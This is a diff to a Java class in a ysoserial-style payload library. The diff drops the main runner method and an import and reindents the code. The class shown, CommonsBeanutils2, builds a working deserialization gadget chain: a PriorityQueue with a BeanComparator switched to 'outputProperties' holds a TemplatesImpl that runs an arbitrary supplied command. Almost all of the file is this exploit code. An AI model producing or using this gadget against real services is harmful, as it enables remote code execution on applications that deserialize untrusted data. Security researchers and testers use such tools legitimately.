@@ -1,10 +1,8 @@
 package org.su18.ysuserial.payloads;
 
 import org.apache.commons.beanutils.BeanComparator;
-import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 import java.util.PriorityQueue;
@@ -13,29 +11,25 @@ import java.util.PriorityQueue;
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
 public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutils2.class, args);
-    }
+	public Object getObject(final String command) throws Exception {
+		final Object template = Gadgets.createTemplatesImpl(command);
+		// mock method name until armed
+		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
-    public Object getObject(final String command) throws Exception {
-        final Object template = Gadgets.createTemplatesImpl(command);
-        // mock method name until armed
-        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+		// create queue with numbers and basic comparator
+		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+		// stub data for replacement later
+		queue.add("1");
+		queue.add("1");
 
-        // create queue with numbers and basic comparator
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        // stub data for replacement later
-        queue.add("1");
-        queue.add("1");
+		// switch method called by comparator
+		Reflections.setFieldValue(comparator, "property", "outputProperties");
 
-        // switch method called by comparator
-        Reflections.setFieldValue(comparator, "property", "outputProperties");
+		// switch contents of queue
+		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+		queueArray[0] = template;
+		queueArray[1] = template;
 
-        // switch contents of queue
-        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        queueArray[0] = template;
-        queueArray[1] = template;
-
-        return queue;
-    }
+		return queue;
+	}
 }
